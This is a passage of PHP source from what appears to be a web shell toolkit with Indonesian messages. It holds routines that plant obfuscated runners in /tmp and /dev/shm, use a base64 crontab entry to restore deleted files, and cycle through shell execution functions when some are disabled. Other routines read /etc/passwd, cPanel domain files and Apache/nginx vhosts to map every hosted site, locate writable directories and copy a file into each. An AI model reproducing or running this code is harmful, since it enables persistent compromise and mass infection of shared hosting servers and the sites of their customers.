            $steps[] = 'SPE tried: ' . implode(' → ', $run2['tried']);
        }
        
        if ((int)$run2['exit_code'] === 0 || empty($run2['no_shell'])) {
            $run = $run2;
        }
    }

    if (!empty($run['no_shell']) && (int)$run['exit_code'] !== 0) {
        @unlink($tmpCron);
        return array(
            'ok' => false,
            'error' => isset($run['output']) ? $run['output'] : 'Failed to run cron.sh (no shell method worked)',
            'steps' => $steps,
        );
    }
    if (!empty($run['output']) && $run['output'] !== '(no output)') {
        $steps[] = 'cron.sh output: ' . substr(preg_replace('/\s+/', ' ', (string)$run['output']), 0, 240);
    }

    
    if (is_file($tmpCron)) {
        @unlink($tmpCron);
        $steps[] = 'Temp cron.sh deleted: ' . $tmpCron;
    } else {
        $steps[] = 'Temp cron.sh already gone';
    }

    usleep(500000);
    $pid = 0;
    if (is_file($pidFile)) {
        $pid = (int)trim((string)@file_get_contents($pidFile));
    }
    if ($pid <= 0) {
        usleep(800000);
        if (is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
        }
    }

    
    $cronCheckEarly = getCrontab();
    $cronContentEarly = isset($cronCheckEarly['content']) ? (string)$cronCheckEarly['content'] : '';
    $hasCronEarly = ($cronContentEarly !== '' && (strpos($cronContentEarly, $cronMarker) !== false || strpos($cronContentEarly, 'cronsh_') !== false));
    if ($pid <= 0 && !$hasCronEarly && !is_file($installPath) && !is_file($shmPath)) {
        $steps[] = 'Artifacts missing after run — rewrite temp + force system/passthru/exec';
        if (@file_put_contents($tmpCron, $script) !== false) {
            @chmod($tmpCron, 0700);
            $run3 = geckoShellRunFallbackSPE($cmd, $cwdCron, 90);
            $steps[] = 'final SPE via ' . (isset($run3['method']) ? $run3['method'] : '?')
                . ' exit=' . (isset($run3['exit_code']) ? $run3['exit_code'] : '?');
            if (!empty($run3['tried'])) {
                $steps[] = 'final SPE tried: ' . implode(' → ', $run3['tried']);
            }
            @unlink($tmpCron);
            usleep(800000);
            if (is_file($pidFile)) {
                $pid = (int)trim((string)@file_get_contents($pidFile));
            }
        }
    }

    
    $cronOk = false;
    $cronCheck = getCrontab();
    $cronContent = isset($cronCheck['content']) ? (string)$cronCheck['content'] : '';
    if ($cronContent !== '' && strpos($cronContent, $cronMarker) !== false) {
        $cronOk = true;
    } elseif ($cronContent !== '' && preg_match('/#\s*cronsh_([a-f0-9]+)/', $cronContent, $m)) {
        $cronOk = true;
        $cronMarker = '# cronsh_' . $m[1];
        $sid = $m[1];
        $installPath = '/tmp/.' . $sid . '/.runner.sh';
        $shmPath = '/dev/shm/.' . $sid . '/.runner.sh';
        $pidFile = '/tmp/.' . $sid . '.pid';
        if (is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
        }
        $steps[] = 'Crontab marker detected (server hash): ' . $cronMarker;
    }

    
    
    if (!$cronOk) {
        $steps[] = 'Crontab missing after cron.sh — heal with short crontab line';
        $cronOk = geckoRecoverEnsureShortCrontab($installPath, $shmPath, $cronMarker, $steps);
        if ($cronOk && is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
        }
    } else {
        
        $scrub = geckoRecoverEnsureShortCrontab($installPath, $shmPath, $cronMarker, $steps);
        if ($scrub) {
            $cronOk = true;
            $steps[] = 'Crontab scrubbed/rewritten as short line (safe)';
        }
    }

    $steps[] = 'cron.sh verify:';
    $steps[] = '- obfuscated /tmp runner: ' . (is_file($installPath) ? 'OK' : 'MISSING');
    $steps[] = '- obfuscated /dev/shm runner: ' . (is_file($shmPath) ? 'OK' : 'MISSING');
    $steps[] = '- PID: ' . ($pid > 0 ? ('OK ' . $pid) : 'MISSING') . ' (' . $pidFile . ')';
    $steps[] = '- Crontab: ' . ($cronOk ? 'OK' : 'MISSING');

    $ok = (is_file($installPath) || is_file($shmPath) || $pid > 0 || $cronOk);
    $msgParts = array();
    if ($ok) {
        $msgParts[] = 'Persistence aktif';
        if ($pid > 0 || is_file($installPath) || is_file($shmPath)) {
            $msgParts[] = 'daemon/runners OK';
        }
        $msgParts[] = $cronOk ? 'crontab OK (short b64 cmd)' : 'crontab MISSING';
        $msgParts[] = 'File yang dihapus akan kembali otomatis' . ($cronOk ? '' : ' via daemon (crontab belum terpasang)');
    } else {
        $msgParts[] = 'cron.sh dijalankan tapi artifacts belum terbaca — cek disable_functions / permission crontab.';
    }
    return array(
        'ok' => $ok,
        'message' => implode(' · ', $msgParts),
        'instance_id' => $instanceId,
        'install_path' => $installPath,
        'shm_path' => $shmPath,
        'pid_file' => $pidFile,
        'pid' => $pid,
        'crontab' => $cronOk,
        'cron_marker' => $cronMarker,
        'mutual_backup' => true,
        'obfuscated' => is_file($installPath) || is_file($shmPath),
        'async' => false,
        'method' => 'remote_cron_sh',
        'steps' => $steps,
    );
}



function geckoRecoverDeployPersistence($dirPath, $fileName, $downloadUrl)
{
    return geckoRecoverDeployViaRemoteCronSh($dirPath, $fileName, $downloadUrl);
}

function geckoMassExclDirs()
{
    return array(
        'cagefs', 'caldav', 'cl.selector', 'cpaddons', 'cpanel',
        'cache', 'etc', 'logs', 'lscache', 'mail', 'public_ftp',
        'ssl', 'var', 'tmp', 'backup', 'backups', 'session', 'sessions',
    );
}


function geckoMassSkipScan()
{
    return array(
        '.git', '.svn', 'node_modules', '__pycache__',
        'cache', 'tmp', 'logs', 'session', 'sessions',
        'backup', 'backups', 'sass-cache', '.idea',
    );
}


function geckoMassWebRoots()
{
    return array('public_html', 'www', 'htdocs', 'html', 'public', 'web');
}


function geckoMassIsDomain($name)
{
    if (!$name || $name === '.' || $name === '..') return false;
    if (isset($name[0]) && $name[0] === '.') return false;
    if (strpos($name, '.') === false) return false;
    return !in_array(strtolower($name), geckoMassExclDirs(), true);
}


function geckoMassFindDomains($base)
{
    $domains = array();
    $base = rtrim(str_replace('\\', '/', (string)$base), '/');
    if ($base === '') return $domains;

    if (strpos($base, '*') !== false) {
        $userDirs = @glob($base, GLOB_ONLYDIR);
        if (!is_array($userDirs)) $userDirs = array();
        foreach ($userDirs as $ud) {
            $subs = @glob(rtrim(str_replace('\\', '/', $ud), '/') . '/*', GLOB_ONLYDIR);
            if (!is_array($subs)) continue;
            foreach ($subs as $sub) {
                if (geckoMassIsDomain(basename($sub))) {
                    $domains[] = str_replace('\\', '/', $sub);
                }
            }
        }
    } else {
        $subs = @glob($base . '/*', GLOB_ONLYDIR);
        if (!is_array($subs)) $subs = array();
        foreach ($subs as $sub) {
            if (geckoMassIsDomain(basename($sub))) {
                $domains[] = str_replace('\\', '/', $sub);
            }
        }
    }
    return $domains;
}


function geckoMassReadLines($path)
{
    $path = (string)$path;
    if ($path === '' || !@is_file($path) || !@is_readable($path)) {
        return array();
    }
    $raw = @file($path, FILE_IGNORE_NEW_LINES);
    if (is_array($raw)) {
        return $raw;
    }
    $txt = @file_get_contents($path);
    if ($txt === false || $txt === '') {
        return array();
    }
    return preg_split("/\r\n|\n|\r/", $txt);
}


function geckoMassOwnerOf($path)
{
    $path = (string)$path;
    if ($path === '' || !@file_exists($path)) {
        return '';
    }
    if (function_exists('posix_getpwuid') && function_exists('fileowner')) {
        $uid = @fileowner($path);
        if ($uid !== false) {
            $info = @posix_getpwuid($uid);
            if (is_array($info) && !empty($info['name'])) {
                return (string)$info['name'];
            }
        }
    }
    if (function_exists('geckoShellRun')) {
        $r = geckoShellRun('stat -c %U ' . geckoEscapeshellarg($path) . ' 2>/dev/null', '/tmp', 5);
        $out = isset($r['output']) ? trim($r['output']) : '';
        if ($out !== '' && preg_match('/^[a-zA-Z0-9_\-]+$/', $out)) {
            return $out;
        }
    }
    return '';
}


function geckoMassUserPublicHtml($user)
{
    $user = trim((string)$user);
    if ($user === '' || !preg_match('/^[a-zA-Z0-9_\-]+$/', $user)) {
        return '';
    }
    $candidates = array(
        '/home/' . $user . '/public_html',
        '/home/' . $user . '/www',
        '/home/' . $user . '/htdocs',
        '/var/www/' . $user . '/public_html',
    );
    foreach ($candidates as $p) {
        if (@is_dir($p)) {
            return str_replace('\\', '/', $p);
        }
    }
    return '/home/' . $user . '/public_html';
}


function geckoMassIsJunkDomain($domain)
{
    $d = strtolower(trim((string)$domain));
    if ($d === '' || $d === '.' || $d === 'localhost') return true;
    if (isset($d[0]) && $d[0] === '.') return true;
    if (strpos($d, '.') === false) return true;
    
    if (preg_match('/(^|\\.)virtuaserver\\.com\\.br$/i', $d)) return true;
    if (preg_match('/\\.cpanel3\\./i', $d)) return true;
    if (preg_match('/\\.cpanel\\.site$/i', $d)) return true;
    if (preg_match('/\\.webhostbox\\.net$/i', $d)) return true;
    if (preg_match('/\\.cpanel\\.site$/i', $d)) return true;
    if (preg_match('/(^|\\.)cp3\\.sh15\\.net$/i', $d)) return true;
    if (strpos($d, 'cpanel3.virtuaserver') !== false) return true;
    if (preg_match('/\\.\\d{1,3}-\\d{1,3}-\\d{1,3}-\\d{1,3}\\.cpanel\\.site$/i', $d)) return true;
    return false;
}


function geckoMassResolveDocRoot($domain, $user, $hintPath = '')
{
    $domain = strtolower(trim((string)$domain));
    $user = trim((string)$user);
    $hintPath = rtrim(str_replace('\\', '/', (string)$hintPath), '/');
    $cands = array();
    if ($hintPath !== '' && @is_dir($hintPath)) {
        $cands[] = $hintPath;
    }
    if ($user !== '' && $domain !== '' && substr($domain, -6) !== '.local') {
        $cands[] = '/home/' . $user . '/public_html/' . $domain;
        $cands[] = '/home/' . $user . '/' . $domain;
        $cands[] = '/home/' . $user . '/www/' . $domain;
        
        $ud = '/var/cpanel/userdata/' . $user . '/' . $domain;
        if (@is_file($ud) && @is_readable($ud)) {
            foreach (geckoMassReadLines($ud) as $line) {
                if (preg_match('/^documentroot:\\s*(.+)$/i', trim($line), $m)) {
                    $p = trim($m[1]);
                    if ($p !== '') $cands[] = rtrim(str_replace('\\', '/', $p), '/');
                }
            }
        }
    }
    if ($user !== '') {
        $cands[] = geckoMassUserPublicHtml($user);
    }
    
    $best = '';
    $bestScore = -1;
    foreach ($cands as $p) {
        $p = rtrim(str_replace('\\', '/', $p), '/');
        if ($p === '' || !@is_dir($p)) continue;
        $score = substr_count($p, '/');
        
        if ($domain !== '' && strpos($p, $domain) !== false) $score += 10;
        if ($score > $bestScore) {
            $bestScore = $score;
            $best = $p;
        }
    }
    return $best;
}


function geckoMassDiscoverFromSystem()
{
    $out = array();
    $seen = array();
    $methods = array();
    $add = function ($domain, $user, $path = '', $srcName = 'system') use (&$out, &$seen) {
        $domain = strtolower(trim((string)$domain));
        $user = trim((string)$user);
        if (geckoMassIsJunkDomain($domain)) return;
        if ($user === '' || !preg_match('/^[a-zA-Z0-9_\-]+$/', $user)) return;
        if ($domain === '') return;
        $key = $domain;
        if (isset($seen[$key])) return;
        $seen[$key] = true;
        $path = geckoMassResolveDocRoot($domain, $user, $path);
        if ($path === '') {
            $path = geckoMassUserPublicHtml($user);
        }
        $path = rtrim(str_replace('\\', '/', (string)$path), '/');
        $out[] = array(
            'domain' => $domain,
            'user' => $user,
            'path' => $path,
            'source' => $srcName,
        );
    };

    
    if (@is_file('/etc/virtual/domainowners') && @is_readable('/etc/virtual/domainowners')) {
        $n = 0;
        foreach (geckoMassReadLines('/etc/virtual/domainowners') as $line) {
            $line = trim($line);
            if ($line === '' || strpos($line, ':') === false) continue;
            $parts = explode(':', $line, 2);
            $add(trim($parts[0]), trim($parts[1]), '', 'domainowners');
            $n++;
        }
        if ($n > 0) $methods[] = 'domainowners';
    }

    
    if (@is_file('/etc/userdatadomains') && @is_readable('/etc/userdatadomains')) {
        $n = 0;
        foreach (geckoMassReadLines('/etc/userdatadomains') as $line) {
            $line = trim($line);
            if ($line === '' || strpos($line, ':') === false) continue;
            $parts = explode(':', $line, 2);
            $domain = trim($parts[0]);
            $rest = trim($parts[1]);
            $user = $rest;
            $doc = '';
            if (preg_match('/^([a-zA-Z0-9_\-]+)/', $rest, $m)) {
                $user = $m[1];
            }
            
            if (strpos($rest, '==') !== false) {
                $bits = explode('==', $rest);
                if (!empty($bits[0])) $user = trim($bits[0]);
                foreach ($bits as $b) {
                    $b = trim($b);
                    if ($b !== '' && $b[0] === '/' && strpos($b, '/home/') === 0) {
                        $doc = $b;
                        break;
                    }
                }
            }
            $add($domain, $user, $doc, 'userdatadomains');
            $n++;
        }
        if ($n > 0) $methods[] = 'userdatadomains';
    }

    
    $namedDomains = array();
    foreach (geckoMassReadLines('/etc/named.conf') as $line) {
        if (stripos($line, 'zone') === false) continue;
        if (preg_match('/zone\s+"([^"]+)"/i', $line, $m)) {
            $d = strtolower(trim($m[1]));
            if (geckoMassIsJunkDomain($d)) continue;
            if (strlen($d) > 2 && strpos($d, '.') !== false) {
                $namedDomains[$d] = true;
            }
        }
    }

    $valiases = array();
    if (@is_dir('/etc/valiases') && @is_readable('/etc/valiases')) {
        $scan = @scandir('/etc/valiases');
        if (is_array($scan)) {
            foreach ($scan as $name) {
                if ($name === '.' || $name === '..') continue;
                if (geckoMassIsJunkDomain($name)) continue;
                $valiases[strtolower($name)] = '/etc/valiases/' . $name;
            }
        }
    }
    foreach ($namedDomains as $d => $_) {
        if (!isset($valiases[$d])) {
            $valiases[$d] = '/etc/valiases/' . $d;
        }
    }
    $nNamed = 0;
    foreach ($valiases as $domain => $valiasPath) {
        if (geckoMassIsJunkDomain($domain)) continue;
        $user = '';
        if (@file_exists($valiasPath)) {
            $user = geckoMassOwnerOf($valiasPath);
        }
        
        if (($user === '' || $user === 'root') && @is_file('/etc/trueuserdomains')) {
            foreach (geckoMassReadLines('/etc/trueuserdomains') as $tl) {
                $tl = trim($tl);
                if (stripos($tl, strtolower($domain)) === 0 && strpos($tl, ':') !== false) {
                    $tp = explode(':', $tl, 2);
                    if (strtolower(trim($tp[0])) === strtolower($domain)) {
                        $user = trim($tp[1]);
                        break;
                    }
                }
            }
        }
        if ($user === '' || $user === 'root') continue;
        $add($domain, $user, '', 'named+valiases');
        $nNamed++;
    }
    if ($nNamed > 0) $methods[] = 'named+valiases';

    
    if (empty($out)) {
        $byUser = array();
        foreach (geckoMassReadLines('/etc/passwd') as $line) {
            $parts = explode(':', $line);
            if (count($parts) < 6) continue;
            $user = $parts[0];
            $uid = (int)$parts[2];
            $home = $parts[5];
            if ($uid < 500) continue;
            if ($user === 'nobody' || $user === 'nfsnobody') continue;
            $ph = rtrim(str_replace('\\', '/', $home), '/') . '/public_html';
            if (!@is_dir($ph)) {
                $ph = geckoMassUserPublicHtml($user);
            }
            if (!@is_dir($ph)) continue;
            if (isset($byUser[$user])) continue;
            $byUser[$user] = true;
            $add($user . '.site.local', $user, $ph, 'passwd');
        }
        if (!empty($out)) $methods[] = 'passwd';
    }

    return array(
        'ok' => !empty($out),
        'method' => implode('+', $methods),
        'entries' => $out,
        'error' => empty($out) ? 'Tidak bisa baca domainowners/userdatadomains/named/valiases/passwd.' : '',
    );
}


function geckoMassResolveTargetsV2()
{
    $sys = geckoMassDiscoverFromSystem();
    if (empty($sys['entries'])) {
        return array(
            'ok' => false,
            'mode' => 'v2-system',
            'method' => isset($sys['method']) ? $sys['method'] : '',
            'targets' => array(),
            'error' => isset($sys['error']) ? $sys['error'] : 'Discovery sistem kosong.',
        );
    }

    $byPath = array();
    foreach ($sys['entries'] as $e) {
        $user = isset($e['user']) ? $e['user'] : '';
        $domain = isset($e['domain']) ? $e['domain'] : '';
        if ($user === '' || $domain === '') continue;
        if (geckoMassIsJunkDomain($domain)) continue;

        $path = isset($e['path']) ? $e['path'] : '';
        $path = geckoMassResolveDocRoot($domain, $user, $path);
        if ($path === '' || !@is_dir($path)) {
            $path = geckoMassUserPublicHtml($user);
        }
        if ($path === '' || !@is_dir($path)) {
            continue;
        }
        $pathKey = $path;
        
        $rp = @realpath($path);
        if ($rp) $pathKey = str_replace('\\', '/', $rp);

        if (!isset($byPath[$pathKey])) {
            $byPath[$pathKey] = array(
                'domain' => $domain,
                'user' => $user,
                'domainDir' => $path,
                'domains' => array($domain),
                'source' => isset($sys['method']) ? $sys['method'] : 'system',
            );
        } else {
            if (!in_array($domain, $byPath[$pathKey]['domains'], true)) {
                $byPath[$pathKey]['domains'][] = $domain;
            }
            
            if (substr($byPath[$pathKey]['domain'], -6) === '.local' && substr($domain, -6) !== '.local') {
                $byPath[$pathKey]['domain'] = $domain;
            }
        }
    }

    $targets = array_values($byPath);
    return array(
        'ok' => !empty($targets),
        'mode' => 'v2-system',
        'method' => isset($sys['method']) ? $sys['method'] : '',
        'targets' => $targets,
        'discovered_domains' => count($sys['entries']),
        'unique_docroots' => count($targets),
        'error' => empty($targets) ? 'Tidak ada document root writable dari discovery.' : '',
    );
}


function geckoMassVhostDirs()
{
    return array(
        '/etc/apache2/sites-enabled',
        '/etc/nginx/sites-enabled',
    );
}


function geckoMassNormalizeVhostDomain($name)
{
    $name = strtolower(trim((string)$name));
    $name = trim($name, " \t\"';");
    if ($name === '' || $name === '_' || $name === 'default' || $name === 'default_server') {
        return '';
    }
    
    if (isset($name[0]) && $name[0] === '*') {
        $name = ltrim($name, '*.');
    }
    if ($name === '' || geckoMassIsJunkDomain($name)) {
        return '';
    }
    return $name;
}


function geckoMassListVhostConfFiles($dir)
{
    $dir = rtrim(str_replace('\\', '/', (string)$dir), '/');
    $out = array();
    if ($dir === '' || !@is_dir($dir) || !@is_readable($dir)) {
        return $out;
    }
    $scan = @scandir($dir);
    if (!is_array($scan)) {
        return $out;
    }
    foreach ($scan as $name) {
        if ($name === '.' || $name === '..') continue;
        $full = $dir . '/' . $name;
        
        if (@is_link($full)) {
            $real = @realpath($full);
            if ($real) $full = str_replace('\\', '/', $real);
        }
        if (!@is_file($full) || !@is_readable($full)) continue;
        
        $base = basename($full);
        if (preg_match('/\.(bak|old|dist|example|rpmnew|dpkg-dist)$/i', $base)) continue;
        if (strpos($base, '.conf') === false && !preg_match('/^[a-zA-Z0-9_.\-]+$/', $base)) continue;
        $out[] = $full;
    }
    return array_values(array_unique($out));
}


function geckoMassParseApacheVhosts($content)
{
    $entries = array();
    $content = (string)$content;
    if ($content === '') return $entries;

    if (preg_match_all('/<VirtualHost\b[^>]*>(.*?)<\/VirtualHost>/is', $content, $blocks, PREG_SET_ORDER)) {
        foreach ($blocks as $block) {
            $body = $block[1];
            $serverNames = array();
            if (preg_match('/^\s*ServerName\s+(.+)$/im', $body, $m)) {
                $dn = geckoMassNormalizeVhostDomain($m[1]);
                if ($dn !== '') $serverNames[] = $dn;
            }
            if (preg_match_all('/^\s*ServerAlias\s+(.+)$/im', $body, $am)) {
                foreach ($am[1] as $aliasLine) {
                    foreach (preg_split('/\s+/', trim($aliasLine)) as $alias) {
                        $dn = geckoMassNormalizeVhostDomain($alias);
                        if ($dn !== '' && !in_array($dn, $serverNames, true)) {
                            $serverNames[] = $dn;
                        }
                    }
                }
            }
            $docRoot = '';
            if (preg_match('/^\s*DocumentRoot\s+["\']?([^"\'\s]+)["\']?/im', $body, $dm)) {
                $docRoot = rtrim(str_replace('\\', '/', trim($dm[1])), '/');
            }
            if ($docRoot === '' || empty($serverNames)) continue;
            $entries[] = array(
                'domains' => $serverNames,
                'path' => $docRoot,
                'engine' => 'apache',
            );
        }
        return $entries;
    }

    
    $serverNames = array();
    if (preg_match('/^\s*ServerName\s+(.+)$/im', $content, $m)) {
        $dn = geckoMassNormalizeVhostDomain($m[1]);
        if ($dn !== '') $serverNames[] = $dn;
    }
    if (preg_match_all('/^\s*ServerAlias\s+(.+)$/im', $content, $am)) {
        foreach ($am[1] as $aliasLine) {
            foreach (preg_split('/\s+/', trim($aliasLine)) as $alias) {
                $dn = geckoMassNormalizeVhostDomain($alias);
                if ($dn !== '' && !in_array($dn, $serverNames, true)) {
                    $serverNames[] = $dn;
                }
            }
        }
    }
    $docRoot = '';
    if (preg_match('/^\s*DocumentRoot\s+["\']?([^"\'\s]+)["\']?/im', $content, $dm)) {
        $docRoot = rtrim(str_replace('\\', '/', trim($dm[1])), '/');
    }
    if ($docRoot !== '' && !empty($serverNames)) {
        $entries[] = array(
            'domains' => $serverNames,
            'path' => $docRoot,
            'engine' => 'apache',
        );
    }
    return $entries;
}


function geckoMassDiscoverFromVhosts()
{
    $entries = array();
    $methods = array();
    $rawCount = 0;
    $dirsTried = array();

    foreach (geckoMassVhostDirs() as $dir) {
        $dirsTried[] = $dir;
        $files = geckoMassListVhostConfFiles($dir);
        if (empty($files)) continue;

        $isNginx = (stripos($dir, 'nginx') !== false);
        $engine = $isNginx ? 'nginx' : 'apache';
        $n = 0;

        foreach ($files as $file) {
            $txt = @file_get_contents($file);
            if ($txt === false || $txt === '') continue;
            $parsed = $isNginx
                ? geckoMassParseNginxVhosts($txt)
                : geckoMassParseApacheVhosts($txt);
            foreach ($parsed as $p) {
                $path = isset($p['path']) ? rtrim(str_replace('\\', '/', $p['path']), '/') : '';
                $domains = (isset($p['domains']) && is_array($p['domains'])) ? $p['domains'] : array();
                if ($path === '' || empty($domains)) continue;
                $rawCount++;
                $n++;
                $entries[] = array(
                    'domains' => $domains,
                    'domain' => $domains[0],
                    'path' => $path,
                    'user' => geckoMassOwnerOf($path),
                    'source' => $engine . ':' . basename($file),
                    'engine' => $engine,
                );
            }
        }
        if ($n > 0) $methods[] = $engine . '-sites-enabled';
    }

    return array(
        'ok' => !empty($entries),
        'method' => implode('+', $methods),
        'entries' => $entries,
        'raw_count' => $rawCount,
        'dirs' => $dirsTried,
        'error' => empty($entries)
            ? 'Tidak ada ServerName/DocumentRoot di /etc/apache2/sites-enabled atau /etc/nginx/sites-enabled.'
            : '',
    );
}


function geckoMassResolveTargetsV3()
{
    $sys = geckoMassDiscoverFromVhosts();
    if (empty($sys['entries'])) {
        return array(
            'ok' => false,
            'mode' => 'v3-vhost',
            'method' => isset($sys['method']) ? $sys['method'] : '',
            'targets' => array(),
            'dirs' => isset($sys['dirs']) ? $sys['dirs'] : array(),
            'error' => isset($sys['error']) ? $sys['error'] : 'Discovery vhost kosong.',
        );
    }

    $byPath = array();
    $domainHits = 0;
    $mergedDupes = 0;

    foreach ($sys['entries'] as $e) {
        $path = isset($e['path']) ? rtrim(str_replace('\\', '/', $e['path']), '/') : '';
        if ($path === '' || !@is_dir($path)) continue;

        $domains = array();
        if (isset($e['domains']) && is_array($e['domains'])) {
            foreach ($e['domains'] as $d) {
                $d = geckoMassNormalizeVhostDomain($d);
                if ($d === '') continue;
                if (!in_array($d, $domains, true)) $domains[] = $d;
            }
        }
        if (empty($domains) && !empty($e['domain'])) {
            $d = geckoMassNormalizeVhostDomain($e['domain']);
            if ($d !== '') $domains[] = $d;
        }
        if (empty($domains)) continue;
        $domainHits += count($domains);

        
        $pathKey = $path;
        $rp = @realpath($path);
        if ($rp) $pathKey = str_replace('\\', '/', $rp);

        $user = isset($e['user']) ? trim((string)$e['user']) : '';
        if ($user === '') {
            $user = geckoMassOwnerOf($pathKey);
        }

        if (!isset($byPath[$pathKey])) {
            $byPath[$pathKey] = array(
                'domain' => $domains[0],
                'user' => $user,
                'domainDir' => $pathKey,
                'domains' => $domains,
                'source' => isset($e['source']) ? $e['source'] : 'vhost',
            );
        } else {
            
            foreach ($domains as $d) {
                if (!in_array($d, $byPath[$pathKey]['domains'], true)) {
                    $byPath[$pathKey]['domains'][] = $d;
                }
                $mergedDupes++;
            }
            $cur = $byPath[$pathKey]['domain'];
            if (strlen($domains[0]) < strlen($cur) || substr_count($domains[0], '.') < substr_count($cur, '.')) {
                $byPath[$pathKey]['domain'] = $domains[0];
            }
            if ($byPath[$pathKey]['user'] === '' && $user !== '') {
                $byPath[$pathKey]['user'] = $user;
            }
        }
    }

    $targets = array_values($byPath);
    return array(
        'ok' => !empty($targets),
        'mode' => 'v3-vhost',
        'method' => isset($sys['method']) ? $sys['method'] : 'vhost',
        'targets' => $targets,
        'discovered_domains' => $domainHits,
        'unique_docroots' => count($targets),
        'raw_vhosts' => isset($sys['raw_count']) ? (int)$sys['raw_count'] : 0,
        'merged_dupes' => $mergedDupes,
        'dirs' => isset($sys['dirs']) ? $sys['dirs'] : array(),
        'error' => empty($targets) ? 'DocumentRoot dari vhost tidak ditemukan / tidak readable.' : '',
    );
}


function geckoMassPickMode($v2 = false, $v3 = false, $mode = '')
{
    $mode = strtolower(trim((string)$mode));
    if ($mode === 'v3' || $mode === '3' || $mode === 'vhost') return 'v3';
    if ($mode === 'v2' || $mode === '2' || $mode === 'system') return 'v2';
    if ($mode === 'v1' || $mode === '1' || $mode === 'folder') return 'v1';
    
    if (!empty($v3)) return 'v3';
    if (!empty($v2)) return 'v2';
    return 'v1';
}


function geckoMassResolveTargets($base, $v2 = false, $v3 = false, $mode = '')
{
    $mode = geckoMassPickMode($v2, $v3, $mode);

    
    if ($mode === 'v3') {
        return geckoMassResolveTargetsV3();
    }
    if ($mode === 'v2') {
        return geckoMassResolveTargetsV2();
    }

    
    $base = trim(str_replace('\\', '/', (string)$base));
    $baseLower = strtolower($base);

    
    if ($base === '' || $baseLower === '@system' || $baseLower === 'system' || $baseLower === 'auto') {
        return geckoMassResolveTargetsV2();
    }
    
    if ($baseLower === '@vhost' || $baseLower === 'vhost' || $baseLower === 'v3') {
        return array(
            'ok' => false,
            'mode' => 'folder',
            'method' => 'folder-scan',
            'targets' => array(),
            'error' => 'Base @vhost hanya untuk Mass Copy v3. Aktifkan checkbox v3.',
        );
    }

    $dirs = geckoMassFindDomains($base);
    $targets = array();
    foreach ($dirs as $dir) {
        $targets[] = array(
            'domain' => basename($dir),
            'user' => '',
            'domainDir' => $dir,
            'domains' => array(basename($dir)),
            'source' => 'folder',
        );
    }

    if (empty($targets)) {
        
        $fb = geckoMassResolveTargetsV2();
        if (!empty($fb['targets'])) {
            $fb['mode'] = 'system-fallback';
            return $fb;
        }
        return array(
            'ok' => false,
            'mode' => 'folder',
            'method' => 'folder-scan',
            'targets' => array(),
            'error' => 'Folder scan kosong dan sistem domain tidak terbaca.',
        );
    }

    return array(
        'ok' => true,
        'mode' => 'folder',
        'method' => 'folder-scan',
        'targets' => $targets,
        'error' => '',
    );
}


function geckoMassShellCopy($src, $dest)
{
    $cmd = 'cp ' . geckoEscapeshellarg($src) . ' ' . geckoEscapeshellarg($dest) . ' && echo __CPOK__';

    if (function_exists('shell_exec')) {
        $out = (string)@shell_exec($cmd);
        if (strpos($out, '__CPOK__') !== false) return true;
    }
    if (function_exists('exec')) {
        $lines = array();
        @exec($cmd, $lines);
        if (strpos(implode('', $lines), '__CPOK__') !== false) return true;
    }
    if (function_exists('system')) {
        ob_start();
        @system($cmd);
        $out = (string)ob_get_clean();
        if (strpos($out, '__CPOK__') !== false) return true;
    }
    if (function_exists('passthru')) {
        ob_start();
        @passthru($cmd);
        $out = (string)ob_get_clean();
        if (strpos($out, '__CPOK__') !== false) return true;
    }
    if (function_exists('popen') && function_exists('pclose')) {
        $h = @popen($cmd, 'r');
        if (is_resource($h)) {
            $out = (string)@fread($h, 256);
            @pclose($h);
            if (strpos($out, '__CPOK__') !== false) return true;
        }
    }
    
    if (function_exists('geckoRunBashScriptFile')) {
        $r = geckoRunBashScriptFile($cmd, dirname($dest), 30);
        if (isset($r['output']) && strpos($r['output'], '__CPOK__') !== false) return true;
    }
    return false;
}


function geckoMassSmartCopy($src, $dest)
{
    if (@copy($src, $dest) && is_file($dest)) return 'copy';
    $content = @file_get_contents($src);
    if ($content !== false && @file_put_contents($dest, $content) !== false && is_file($dest)) {
        return 'fpc';
    }
    if (geckoMassShellCopy($src, $dest) && is_file($dest)) return 'shell';
    return false;
}


function geckoMassFindWritableDirs($root, $max = 8, $minDepth = 0, $maxDepth = 12)
{
    $skip = geckoMassSkipScan();
    $found = array();
    $scanned = 0;
    $minDepth = (int)$minDepth;
    $maxDepth = (int)$maxDepth;
    if ($minDepth < 0) $minDepth = 0;
    if ($maxDepth < 1) $maxDepth = 1;
    if ($maxDepth > 16) $maxDepth = 16;
    $root = rtrim(str_replace('\\', '/', (string)$root), '/');
    
    $stack = array(array($root, 0));
    while ($stack && $scanned < 12000) {
        $item = array_pop($stack);
        $dir = $item[0];
        $depth = $item[1];
        $scanned++;
        if (!is_dir($dir) || !is_readable($dir)) continue;
        
        
        if ($depth >= $minDepth && @is_writable($dir)) {
            $found[] = array($dir, $depth);
        }
        if ($depth >= $maxDepth) continue;
        $subs = @scandir($dir);
        if (!is_array($subs)) continue;
        
        $subs = array_values(array_filter($subs, function ($s) {
            return $s !== '.' && $s !== '..';
        }));
        sort($subs);
        $subs = array_reverse($subs);
        foreach ($subs as $s) {
            if (in_array($s, $skip, true)) continue;
            $p = $dir . '/' . $s;
            if (is_dir($p) && !is_link($p)) {
                $stack[] = array($p, $depth + 1);
            }
        }
    }
    usort($found, function ($a, $b) {
        if ($a[1] === $b[1]) return strcmp($a[0], $b[0]);
        return $b[1] - $a[1]; 
    });
    $dirs = array();
    foreach ($found as $f) {
        $dirs[] = $f[0];
    }
    return array_slice($dirs, 0, max(1, (int)$max));
}


function geckoMassIsLaravelApp($dir)
{
    $dir = rtrim(str_replace('\\', '/', (string)$dir), '/');
    if ($dir === '' || !@is_dir($dir)) {
        return false;
    }
    if (!@is_dir($dir . '/public')) {
        return false;
    }
    return @is_file($dir . '/.env') || @is_file($dir . '/artisan');
}


function geckoMassLaravelPublicDir($dir)
{
    $dir = rtrim(str_replace('\\', '/', (string)$dir), '/');
    if ($dir === '') {
        return '';
    }
    if (basename($dir) === 'public') {
        $parent = dirname($dir);
        if (geckoMassIsLaravelApp($parent)) {
            return $dir;
        }
    }
    if (geckoMassIsLaravelApp($dir)) {
        return $dir . '/public';
    }
    $parent = dirname($dir);
    if ($parent !== $dir && geckoMassIsLaravelApp($parent)) {
        return $parent . '/public';
    }
    return '';
}


function geckoMassIsOpenSidApp($dir)
{
    $dir = rtrim(str_replace('\\', '/', (string)$dir), '/');
